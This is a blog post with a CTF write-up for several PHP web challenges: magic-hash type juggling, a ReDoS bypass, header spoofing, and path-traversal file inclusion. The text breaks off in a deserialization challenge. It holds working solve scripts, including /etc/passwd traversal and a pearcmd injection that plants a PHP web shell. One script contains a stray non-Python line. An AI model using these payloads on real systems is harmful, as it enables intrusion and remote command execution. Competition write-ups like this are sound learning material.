<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Megat Zafran">


    <meta name="subtitle" content="that one socially inept kid">


    <meta name="description" content="whoami">


    <meta name="keywords" content="aan0303, megat, ilikeronnnnii">


<title>EQCTF | aan0303</title>



    <link rel="icon" href="/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/music">Music</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/music">Music</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">EQCTF</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Megat Zafran</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">January 19, 2025&nbsp;&nbsp;15:03:30</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeups/">Writeups</a>
                            
                                <a href="/categories/Writeups/Local-Competition/">Local Competition</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Sourceful-Egg"><a href="#Sourceful-Egg" class="headerlink" title="Sourceful Egg"></a>Sourceful Egg</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>First you need to send a <code>POST</code> request with the data <code>egg</code> to access inside the <code>if</code> block.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;egg&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    random codes...</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re not even touching the egg...?!!!&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Anyway, here&#x27;s a picture of an egg &lt;br&gt;&lt;br&gt;&lt;img src=&#x27;img/togepi.gif&#x27;&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now inside the <code>if</code> block there are <code>two functions</code> you need to consider.</p>
<h4 id="eggSecret-Function"><a href="#eggSecret-Function" class="headerlink" title="eggSecret Function"></a>eggSecret Function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$secretHash</span> = <span class="string">&#x27;00e39786989574093743872279278460&#x27;</span>; <span class="comment">//can remove the first &#x27;0&#x27;</span></span><br><span class="line"> <span class="variable">$eggWorthyStatus</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;eggSecret&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;eggSecret&#x27;</span>]) == <span class="variable">$secretHash</span>) &#123; &lt;-- vulnerable condition</span><br><span class="line">          <span class="variable">$eggWorthyStatus</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$eggWorthyStatus</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>Php is a bit weird, if you encrypt <code>240610708</code> with hash.. the result <code>0e462097431906509019562988736854</code> will be the same as <code>0</code> but it only works in one condition, which is when using <code>==</code> operator.</p>
<blockquote>
<p><code>md5(240610708) = 0e462097431906509019562988736854 = 0 (when ==)</code></p>
</blockquote>
<p>So if we are comparing <code>0e462097431906509019562988736854</code> and <code>0e39786989574093743872279278460</code> with <code>==</code> it is technically true because <code>0 == 0</code></p>
<h4 id="egg-Function"><a href="#egg-Function" class="headerlink" title="egg Function"></a>egg Function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$egg</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;egg&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(.*?)+$/s&quot;</span>, <span class="variable">$egg</span>)) &#123; &lt;-- vulnerable condition</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Find me the egg please&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$eggWorthyStatus</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;You are a true egg connoisseur! Here is your egg flag: &quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Find me the egg please&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>That <code>preg_match(&quot;/^(.*?)+$/s&quot;, $egg)</code> condition is vulnerable to <a target="_blank" rel="noopener" href="https://learn.snyk.io/lesson/redos">ReDoS</a>, to bypass it just spam as many <code>AAA&#39;s</code> as you can.</p>
<h3 id="Solve-Script"><a href="#Solve-Script" class="headerlink" title="Solve Script"></a>Solve Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://135.181.88.229:33722?eggSecret=240610708&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">33009</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;egg&#x27;</span>: payload&#125;</span><br><span class="line">preg_match(<span class="string">&quot;/^(.*?)+$/s&quot;</span>, $egg)</span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h2 id="King-Brews"><a href="#King-Brews" class="headerlink" title="King Brews"></a>King Brews</h2><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>This is blackbox challenge so I can’t show you the source code.</p>
<p>If you press any menu, you will be sending <code>GET</code> request with the parameter <code>page</code> like so:-</p>
<p><a target="_blank" rel="noopener" href="http://135.181.88.229:50003/?page=about.php">http://135.181.88.229:50003/?page=about.php</a></p>
<h3 id="Solve-Script-1"><a href="#Solve-Script-1" class="headerlink" title="Solve Script"></a>Solve Script</h3><p>To test if the website is vulnerable to LFI, you can try to do the good ol’ trick <code>../../../../</code></p>
<p><a target="_blank" rel="noopener" href="http://135.181.88.229:50003/?page=../../../../../../etc/passwd">http://135.181.88.229:50003/?page=../../../../../../etc/passwd</a></p>
<p><img src="/./images/imageEq.png" alt="alt text"></p>
<p>If you somehow managed to read the <code>/etc/passwd</code> which is a sensitive file that means the website is vulnerable to LFI.</p>
<p>So now, all you need to do is find the flag, the challenge creator actually provided a hint where the flag is located.</p>
<p><img src="/./images/imageEq2.png" alt="alt text"></p>
<p>If you hover on that button, it redirect to <code>menu.php</code>, so let’s try to find out how to read <code>menu.php</code></p>
<p>You can actually chain <code>LFI</code> to <code>RCE</code> if the code allows you to include <code>php wrapper</code> in input or if the website has <code>pearcmd</code> enabled.</p>
<p>In this case I’m using this method instead <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md#lfi-to-rce-via-php-pearcmd">Pearcmd LFI to RCE</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://135.181.88.229:50003&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/exec.php+-d+man_dir=&lt;?echo(system($_GET[&#x27;c&#x27;]));?&gt;+-s+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line"></span><br><span class="line">r2 = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=/tmp/exec.php&amp;c=cat+menu.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>

<h2 id="Secret-Access-Unintended"><a href="#Secret-Access-Unintended" class="headerlink" title="Secret Access (Unintended)"></a>Secret Access (Unintended)</h2><h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>We need to send both <code>secret</code> and <code>code</code> parameters using <code>GET</code> request.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;Missing required parameters.&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Right after that there are couple of <code>header</code> request that you need to include to follow the <code>if</code> condition requirement.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REMOTE_IP&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REMOTE_IP&#x27;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something is not quite right...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] !== <span class="string">&#x27;CTF-Challenge-Agent&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something is not quite right...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_AUTH_KEY&#x27;</span>]) || !<span class="title function_ invoke__">is_valid_auth_key</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_AUTH_KEY&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something is not quite right...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_valid_secret</span>(<span class="variable">$secret</span>) &amp;&amp; <span class="title function_ invoke__">is_valid_code</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not bad! Here is your flag: [REDACTED]&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Parameter value incorrect&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Then, you need to find out how to decode the <code>secret</code> value from this function, actually, the intended solution is to do <code>php type juggling</code> but I managed to decode everything one by one and <code>URL Encode</code> the values lol.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_secret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys1</span> = [<span class="number">12</span>, <span class="number">23</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">67</span>, <span class="number">78</span>, <span class="number">89</span>, <span class="number">90</span>]; <span class="comment">// XOR Keys</span></span><br><span class="line">    <span class="variable">$keys2</span> = [<span class="number">91</span>, <span class="number">82</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">19</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$encoded_parts</span> = [</span><br><span class="line">        <span class="string">&#x27;ND0=&#x27;</span>, <span class="string">&#x27;Yz0=&#x27;</span>, <span class="string">&#x27;Ij0=&#x27;</span>, <span class="string">&#x27;TT0=&#x27;</span>, <span class="string">&#x27;ZD0=&#x27;</span>, <span class="string">&#x27;bz0=&#x27;</span>, <span class="string">&#x27;dz0=&#x27;</span>, <span class="string">&#x27;cj0=&#x27;</span>, <span class="string">&#x27;cz0=&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$order</span> = [<span class="number">6</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$decoded_secret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reassembled</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$order</span> <span class="keyword">as</span> <span class="variable">$index</span>) &#123;</span><br><span class="line">        <span class="variable">$reassembled</span> .= <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encoded_parts</span>[<span class="variable">$index</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$reassembled</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$reassembled</span>[<span class="variable">$i</span>]) ^ <span class="variable">$keys2</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$decoded_secret</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$char</span> ^ <span class="variable">$keys1</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$decoded_secret</span>; &lt;-- actually you can just host it locally <span class="keyword">and</span> get the values straight <span class="title function_ invoke__">away</span> (got funny chars so url encode it is better)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strcmp</span>(<span class="variable">$secret</span>, <span class="variable">$decoded_secret</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>secret</code> values you should get <code>+x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D</code>.</p>
<p>Next we have <code>is_valid_code()</code> function, for this one you need to do <code>php type juggling</code> but using empty array, so <code>code=[]</code>.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_code</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$code</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$code</span> !== <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="variable">$code</span> !== <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The last function is actually to ensure that the <code>X-AUTH-KEY</code> header to have a specific pattern of value</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_auth_key</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&quot;auth-&quot;</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>) === <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>substr($key, 0, 5) === &quot;auth-&quot;</code> - Must start with exactly “auth-“</li>
<li><code>strlen($key) === 10</code> - Total length must be exactly 10 characters</li>
</ol>
<h3 id="Solve-Script-2"><a href="#Solve-Script-2" class="headerlink" title="Solve Script"></a>Solve Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://135.181.88.229:33430/?secret=%20x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D&amp;code=[]&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;CTF-Challenge-Agent&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;X-REMOTE-IP&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;X-AUTH-KEY&#x27;</span>: <span class="string">&#x27;auth-12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(url, headers=headers)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode())</span><br></pre></td></tr></table></figure>

<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>When you access the website, there is a input for a <code>Vault Sequence</code>. The end goal of the challenge here is for you to insert a valid sequence that will eventually make the <code>$vault_open</code> to be <code>true</code>.</p>
<p><img src="/./Website/image1.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;sequence.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$vault_open</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$bankPin</span> = <span class="keyword">new</span> <span class="title class_">Sequence</span>();</span><br><span class="line">    <span class="variable">$bankPin</span>-&gt;<span class="title function_ invoke__">generateVaultRandom</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;sequence&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$base64DecodedSequence</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$user</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;DANGER ABORTING&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$validSequence</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$base64DecodedSequence</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;NOT A VALID SEQUENCE&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$validSequence</span> <span class="keyword">instanceof</span> Sequence)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NOT A VALID SEQUENCE&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="number">10</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$validSequence</span>-&gt;vaultCreds = <span class="variable">$bankPin</span>-&gt;vaultCreds; <span class="comment">//set as bank creds</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">0</span>; <span class="variable">$z</span> &lt; <span class="number">10</span>; <span class="variable">$z</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$validSequence</span>-&gt;vaultCreds[<span class="variable">$z</span>] !== <span class="variable">$validSequence</span>-&gt;guardCreds[<span class="variable">$z</span>]) &#123;</span><br><span class="line">            <span class="variable">$vault_open</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>First step, is to send a <code>POST</code> request with the parameter of <code>sequence</code>, the value must be encoded in base64, if it is empty it will show the <code>DANGER ABORTING</code> output.</p>
